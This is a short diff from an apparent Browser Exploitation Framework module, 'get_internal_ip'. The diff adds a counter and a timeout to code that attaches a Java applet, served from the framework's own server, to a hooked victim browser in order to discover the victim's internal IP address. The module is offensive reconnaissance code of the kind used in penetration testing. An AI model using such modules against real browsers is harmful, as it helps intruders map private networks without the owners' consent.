@@ -16,6 +16,8 @@
 beef.execute(function() {
 
     var applet_uri = 'http://'+beef.net.host+ ':' + beef.net.port + '/';
+	var internal_counter = 0;
+	var timeout = 30;
     var output;
     beef.dom.attachApplet('get_internal_ip', 'get_internal_ip', 'get_internal_ip' ,
         applet_uri, null, null);
